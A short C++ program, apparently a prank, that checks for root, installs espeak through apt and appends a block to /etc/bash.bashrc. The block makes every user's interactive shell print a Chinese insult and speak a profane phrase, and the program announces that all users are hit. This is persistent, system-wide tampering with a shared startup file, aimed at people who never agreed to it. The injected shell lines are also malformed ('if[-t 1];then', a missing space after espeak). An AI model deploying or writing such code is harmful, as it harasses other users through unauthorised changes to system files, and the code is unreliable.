#include<iostream>
#include<cstdlib>
#include<fstream>
#include<unistd.h>

class SystemWidePrank {
private:
    bool checkRoot(){
        return geteuid() == 0;

    }
public:
    void deplay(){
        if(!checkRoot()){
            std::cerr<<"需要root权限!"<<std::endl;
            return;
        }
        
    system("which espeak > /dev/null 2>&1 ||(apt update && apt install -y espeak)");
    std::ofstream globalBashrc("/etc/bash.bashrc",std::ios::app);
    if(globalBashrc.is_open()){
       globalBashrc <<"\n#小江的系统性搞怪\n";
       globalBashrc<<"if[-t 1];then\n";
       globalBashrc<<"   echo \"笨蛋被我耍了吧\"\n";
       globalBashrc<<"   espeak\"fuck you,hahahahah dashabi\"2>/dev/null\n";
       globalBashrc<<"fi\n";
       globalBashrc.close();
       std::cout<<"搞怪环境部署完成！所有用户都会中招"<<std::endl; 
        }
    }    
};
int main(){
    SystemWidePrank prank;
    prank.deplay();
    return 0;
}

